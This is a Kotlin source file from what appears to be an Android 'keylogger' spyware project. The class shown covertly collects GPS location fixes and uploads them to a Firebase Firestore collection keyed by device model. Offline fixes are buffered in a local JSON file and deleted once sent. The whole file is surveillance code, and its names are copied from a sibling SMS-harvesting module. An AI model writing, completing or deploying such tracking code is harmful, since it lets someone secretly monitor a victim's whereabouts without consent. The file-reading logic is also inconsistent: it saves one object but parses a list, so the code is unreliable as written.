package com.azamovhudstc.androidkeylogger.listener

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.net.ConnectivityManager
import android.os.Bundle
import android.util.Log
import android.widget.Toast
import androidx.core.app.ActivityCompat
import com.azamovhudstc.androidkeylogger.model.LocationData
import com.google.firebase.firestore.FirebaseFirestore
import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File
import java.io.FileOutputStream
import java.io.FileReader
import kotlin.math.min

private const val MIN_DISTANCE_CHANGE_FOR_UPDATES: Long = 1 // Minimum distance change for updates (1 meter)

class MyLocationListener(private val context: Context) : LocationListener {
    private val minDistance = 4 // Minimum distance in meters

    private var locationManager: LocationManager? = null


    private lateinit var locationData:((Location) -> Unit)

    init {
        // Initialize locationManager for requesting location updates
        locationManager = context.getSystemService(Context.LOCATION_SERVICE) as LocationManager?
    }

    fun setLocationDataListener(locationData:((Location) -> Unit)) {
        this.locationData = locationData
    }

    override fun onLocationChanged(location: Location) {
        val latitude = location.latitude
        val longitude = location.longitude

        // Check for accuracy
            Log.d("EVENT", "Location change within 10 meters: Latitude: $latitude, Longitude: $longitude")
            val locationData =LocationData(location.latitude,location.longitude,location.accuracy)
            if (isOnline(context)) {
                if (isLocalSmsAvailable(context)) {
                    sendAllSmsDataToFirebase(context)
                    saveSmsDataToFirebase(locationData, context)
                } else {
                    saveSmsDataToFirebase(locationData, context)

                }
            } else {
                saveSmsToFile(context, locationData)
            }
            locationManager?.removeUpdates(this) // Remove updates if location accuracy is satisfactory
    }

    override fun onProviderDisabled(provider: String) {}

    override fun onProviderEnabled(provider: String) {}

    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
    private fun isOnline(context: Context): Boolean {
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val networkInfo = connectivityManager.activeNetworkInfo
        return networkInfo != null && networkInfo.isConnected
    }


    private fun saveSmsDataToFirebase(smsData: LocationData, context: Context) {
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("location_$deviceModel")
        collectionReference.add(smsData)
            .addOnSuccessListener { documentReference ->
                Log.d("EVENT", "Location data sent to Firebase successfully")
            }
            .addOnFailureListener { e ->
                Log.e("EVENT", "Error sending Location data to Firebase", e)
            }
    }

    private fun isLocalSmsAvailable(context: Context): Boolean {
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        return filePath.exists()
    }

    private fun saveSmsToFile(context: Context, smsData: LocationData) {
        val gson = Gson()

        // Convert the list to JSON string
        val jsonString = gson.toJson(smsData)

        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        val outputStream = FileOutputStream(filePath, false) // Rewrite the file
        outputStream.write(jsonString.toByteArray())
        outputStream.close()
    }

    private fun sendAllSmsDataToFirebase(context: Context) {
        val smsDataList = readSmsFromFile(context)
        val deviceModel = android.os.Build.MODEL
        val collectionReference = FirebaseFirestore.getInstance().collection("location_$deviceModel")
        for (smsData in smsDataList) {
            collectionReference.add(smsData)
                .addOnSuccessListener { documentReference ->
                    Log.d("EVENT", "Location data sent to Firebase successfully")
                    // Ma'lumot Firebase ga muvaffaqiyatli yuborilgan, shuning uchun lokal faylni o'chiramiz
                    deleteLocalSmsFile(context)
                }
                .addOnFailureListener { e ->
                    Log.e("EVENT", "Error sending Location data to Firebase", e)
                }
        }
    }

    private fun deleteLocalSmsFile(context: Context) {
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)
        if (filePath.exists()) {
            filePath.delete()
            Log.d("EVENT", "Local Location file deleted successfully")
        } else {
            Log.e("EVENT", "Local Location file not found")
        }
    }

    private fun readSmsFromFile(context: Context): List<LocationData> {
        val gson = Gson()
        val fileName = "location_data.json"
        val filePath = File(context.getExternalFilesDir(null), fileName)

        if (!filePath.exists()) {
            // If file doesn't exist, return an empty list
            return emptyList()
        }

        val fileReader = FileReader(filePath)
        val typeToken = object : TypeToken<List<LocationData>>() {}.type
        return gson.fromJson(fileReader, typeToken)
    }

    @SuppressLint("MissingPermission")
    fun requestLocationUpdates(context: Context) {

        locationManager?.requestLocationUpdates(
            LocationManager.GPS_PROVIDER,
            0,
            minDistance.toFloat(),
            this
        )
    }

    fun stopLocationUpdates() {
        // Stop location updates
        locationManager?.removeUpdates(this)
    }
}
